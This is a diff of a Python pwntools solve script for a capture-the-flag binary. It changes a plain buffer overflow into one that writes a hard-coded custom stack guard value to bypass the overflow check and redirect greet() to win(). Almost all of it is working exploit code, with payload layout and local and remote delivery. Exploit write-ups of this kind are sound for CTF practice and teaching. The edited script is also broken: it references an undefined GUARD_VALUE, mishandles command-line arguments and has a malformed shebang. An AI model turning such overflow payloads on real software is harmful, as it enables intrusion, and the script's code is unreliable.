@@ -1,10 +1,10 @@
 #!usr/bin/env python3
 
 """
-My App - Buffer Overflow Exploit
+Stack Overflow - Canary Bypass Exploit
 S&G Tech CTF Challenge Solution
 
-This exploit overwrite the return address of the greet() function to redirect execution to the win() function, which prints the flag.
+This exploit overwrites the return address of greet() to redirect execution to win(), while preserving the custom stack guard value to bypass the "stack smashing detected" check.
 """
 
 from pwn import *
@@ -13,15 +13,10 @@ from pwn import *
 # Configuration
 # ============================================================
 
-# Set context for the target binary
-context.binary = './vuln'
 context.log_level = 'info'
 
-# Binary and ELF analysis
-elf = ELF('./vuln')
-
-# Remote connection settings (update these for the actual challenge)
-REMOTE_HOST = 'challenge.sgtech.ctf.com'
+# Remote connection settings
+REMOTE_HOST = 'localhost'
 REMOTE_PORT = 1337
 
 # ============================================================
@@ -31,54 +26,63 @@ REMOTE_PORT = 1337
 # Buffer size in greet() function
 BUFFER_SIZE = 64
 
-# Offset to return address (buffer + saved RBP)
-# 64 bytes buffer + 8 bytes saved RBP = 72 bytes
-OFFSET = 72
+# The custom canary guard value from the source (or found via reversing)
+CANARY_VALUE = 0xDEADBEEFDEADC0DE
 
-# Address of win() function (no PIE, so address is static)
-WIN_ADDR = elf.symbols['win']
+# Stack layouf of greet():
+# +----------------------------+ (higher addresses)
+# | return address    (8 bytes)| offset 80
+# +----------------------------+
+# | saved RBP         (8 bytes)| offset 72
+# +----------------------------+
+# | guard             (8 bytes)| offset 64 <- must equal GUARD_VALUE
+# +----------------------------+
+# | name[64]          (64 bytes)| offset 0 <- our input starts here
+# +----------------------------+ (lower addresses / RSP)
+
+OFFSET_TO_GUARD = 64
+OFFSET_TO_RET = 80
 
 # ============================================================
 # Exploit Functions
 # ============================================================
 
-def create_payload():
+def create_payload(win_addr):
     """
     Create the exploit payload.
     
-    Stack layout before overflow
-    +----------------+
-    | return address |
-    +----------------+
-    | saved RBP      |
-    +----------------+
-    | name[64]       |
-    +----------------+
+    Key Point: a guard variable sits between the buffer and saved RBP.
+    If we blindly overflow with 'A's, the guard check fails and exit() is 
+    called before we reach the ret isntruction. We must write the correct 
+    guard value at the right offset.
     
     Payload structure:
-    [padding (72 bytes)] + [win() address (8 bytes)]
+    [64 bytes padding] + [8 bytes guard value] + [8 bytes saved RBP] + [8 bytes win() addr]
     """
-    payload = b'A' * OFFSET     # Fill buffer + saved RBP
-    payload += p64(WIN_ADDR)    # Overwrite return address with win()
-    return payload
+    
+    payload = b'A' * BUFFER_SIZE            # Fill the name buffer
+    payload += p64(CANARY_VALUE)            # Preserve the guard (bypass the check)
+    payload += b'B' * 8                     # Overwrite saved RBP
+    payload += p64(win_addr)                # Overwrite return address with win()
+    return payload  
 
-def exploit_local():
-    """Run the exploit against the local binary"""
+def exploit_local(binary_path):
+    """Run the exploit against the local binary."""
+    elf = ELF(binary_path)
+    context.binary = binary_path
+    win_addr = elf.symbols['win']
+    
     log.info("Starting local exploit...")
+    p = process(binary_path)
     
-    # Start the process
-    p = process('./vuln')
-    
-    # Create and send payload
-    payload = create_payload()
+    payload = create_payload(win_addr)
     log.info(f"Payload length: {len(payload)} bytes")
-    log.info(f"win() address: {hex(WIN_ADDR)}")
+    log.info(f"Guard value: {hex(GUARD_VALUE)}")
+    log.info(f"win() address: {hex(win_addr)}")
     
-    # Wait for prompt and send payload
     p.recvuntil(b'Enter your name: ')
     p.sendline(payload)
     
-    # Receive the flag
     p.recvline()    # "Hello, AAAA...!"
     response = p.recvall(timeout=2)
     
@@ -87,56 +91,43 @@ def exploit_local():
     print("=" * 50)
     
     p.close()
-    
-def exploit_remote():
+
+def exploit_remote(binary_path=None):
     """Run the exploit against the remote server."""
-    log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
+    if binary_path:
+        elf = ELF(binary_path)
+        win_addr = elf.symbols['win']
+    else:
+        # If no binary available, hardcode the address (find with objdump)
+        win_addr = 0x401196     # UPDATE THIS from: objdump -d vuln | grep "<win>"
     
-    # Connect to remote
+    log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
     p = remote(REMOTE_HOST, REMOTE_PORT)
     
-    # Create and send payload
-    payload = create_payload()
+    payload = create_payload(win_addr)
     log.info(f"Payload length: {len(payload)} bytes")
-    log.info(f"win() address: {hex(WIN_ADDR)}")
+    log.info(f"Guard value: {hex(GUARD_VALUE)}")
+    log.info(f"win() address: {hex(win_addr)}")
     
-    # Wait for prompt and send payload
     p.recvuntil(b'Enter your name: ')
     p.sendline(payload)
     
-    # Receive the flag
     p.interactive()
-    
-def generate_payload_file():
-    """Generate a raw payload file for manual testing."""
-    payload = create_payload()
-    
-    with open('solve/payload.bin', 'wb') as f:
-        f.write(payload)
-    
-    log.success("Payload written to solve/payload.bin")
-    log.info(f"Usage: cat solve/payload.bin | ./vuln")
     
 # ============================================================
 # Main
 # ============================================================
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     import sys
-    print("My App - Buffer Overflow Exploit")
-    print("S&G Tech CTF Challenge")
     
-    print(f"[*] Target binary: {context.binary.path}")
-    print(f"[*] win() function at: {hex(WIN_ADDR)}")
-    print(f"[*] Offset to return address: {OFFSET} bytes")
+    print("S&G Tech CTF Challenge")
+    print("Stack Overflow")
     print()
     
-    if len(sys.argv) > 1:
-        if sys.argv[1] == 'remote':
-            exploit_remote()
-        elif sys.argv[1] == 'payload':
-            generate_payload_file()
-        else:
-            print("Usage: python3 solve.py [local|remote|payload]")
+    if len(sys.argv) > 1 and sys.argv[1] == "remote":
+        binary = sys.argv[2] if len(sys.argv) > 2 else None
+        exploit_remote(binary)
     else:
-        exploit_local()
+        binary = sys.argv[1] if len(sys.argv) > 2 else '../vuln'
+        exploit_local(binary)
